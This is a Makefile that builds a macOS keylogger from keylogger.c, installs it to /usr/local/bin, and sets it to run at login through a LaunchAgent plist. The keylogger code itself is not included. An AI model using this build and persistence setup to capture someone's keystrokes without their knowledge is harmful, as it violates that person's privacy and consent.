CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm ~/Library/LaunchAgents/$(PLIST)

startup: install
	cp $(PLIST) ~/Library/LaunchAgents/

clean:
	rm $(EXECUTABLE)

start:
	launchctl load ~/Library/LaunchAgents/$(PLIST)

stop:
	sudo launchctl unload ~/Library/LaunchAgents/$(PLIST)
